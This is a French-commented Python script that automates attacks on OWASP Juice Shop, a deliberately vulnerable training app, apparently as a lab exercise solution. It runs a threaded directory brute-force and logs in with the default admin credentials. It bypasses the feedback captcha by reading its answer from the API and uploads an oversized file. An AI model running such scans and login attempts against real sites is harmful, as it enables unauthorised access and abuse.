import requests
import json
import logging
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

# Configuration du logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def lire_fichier(fichier):
    with open(fichier, "r") as f:
        return f.read().splitlines()

def scanner_dossier(url):
    try:
        reponse = requests.get(url)
        if reponse.ok and "Copyright" not in reponse.text:
            logging.info(f"Dossier trouvé : {url}")
    except requests.RequestException as e:
        logging.error(f"Erreur lors de la requête vers {url}: {e}")

def tenter_login(session, site):
    try:
        login = session.post(site + "/rest/user/login", headers={"Content-Type": "application/json"},
                             data=json.dumps({"email": "admin@juice-sh.op", "password": "admin123"}))
        if not login.ok:
            logging.error("Erreur login")
            return False
        else:
            logging.info("Login Admin ok")
            return True
    except requests.RequestException as e:
        logging.error(f"Erreur lors du login: {e}")
        return False

def publier_avis(session, site):
    try:
        pageavis = session.get(site + "/rest/captcha")
        captchainfos = pageavis.json()
        captchaid = captchainfos["captchaId"]
        captcharep = captchainfos["answer"]
        
        avis = session.post(site + "/api/Feedbacks", headers={"Content-Type": "application/json"},
                            data=json.dumps({"captchaId": captchaid, "captcha": captcharep, "comment": "lol", "rating": "0"}))
        if not avis.ok:
            logging.error("Erreur publication avis")
        else:
            logging.info("Publication Avis 0 étoile ok")
    except (requests.RequestException, json.JSONDecodeError) as e:
        logging.error(f"Erreur lors de la publication de l'avis: {e}")

def uploader_fichier(session, site):
    try:
        with open("a_uploader.txt", "wb") as fichier:
            fichier.truncate(1024*151)

        with open("a_uploader.txt", "rb") as fichier:
            upload = session.post(site + "/file-upload", files={"file": ("nom", fichier.read(), "application/json")})
            if not upload.ok:
                logging.error("Erreur upload")
            else:
                logging.info("Upload fichier volumineux ok")
    except requests.RequestException as e:
        logging.error(f"Erreur lors de l'upload: {e}")

def main(site, liste_mots_cles):
    # Lire les dossiers à scanner depuis le fichier
    chaque_dossier = lire_fichier(liste_mots_cles)
    
    # Scanner les dossiers en parallèle
    with ThreadPoolExecutor(max_workers=10) as executor:
        for dossier in chaque_dossier:
            url = site + dossier
            executor.submit(scanner_dossier, url)
            time.sleep(0.1)  # Eviter de surcharger le serveur
    
    # Créer une session pour les actions authentifiées
    session = requests.Session()

    if tenter_login(session, site):
        publier_avis(session, site)
        uploader_fichier(session, site)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scanner de vulnérabilités web.")
    parser.add_argument("site", help="URL du site cible")
    parser.add_argument("liste_mots_cles", help="Chemin vers le fichier de mots-clés")
    args = parser.parse_args()
    
    main(args.site, args.liste_mots_cles)
